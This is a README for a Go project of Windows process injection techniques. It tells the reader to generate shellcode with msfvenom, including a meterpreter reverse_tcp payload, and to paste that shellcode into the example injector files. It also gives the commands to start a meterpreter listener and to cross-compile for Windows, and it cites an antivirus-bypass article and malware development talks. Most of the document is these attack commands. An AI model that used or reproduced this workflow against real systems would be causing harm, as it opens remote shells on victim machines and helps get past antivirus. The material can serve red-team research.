# go-inject

Process injection techniques written in Go.

## Usage

Use msfvenom to generate shellcode.

```bash
# Testing with calculator.
msfvenom -p windows/x64/exec CMD=calc.exe -f hex

# MSFVENOM
msfvenom -p windows/x64/meterpreter/reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444
```

Place as payload string within one of the example .go files.

Start meterpreter listener:

```bash
use payload/windows/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
to_handler
```

## Build

```bash
env GOOS=windows GOARCH=amd64 go build
```

## References

* https://labs.jumpsec.com/2019/06/20/bypassing-antivirus-with-golang-gopher-it/
* https://github.com/brimstone/go-shellcode
* https://github.com/sysdream/hershell
* https://github.com/yoda66/MalwareDevTalk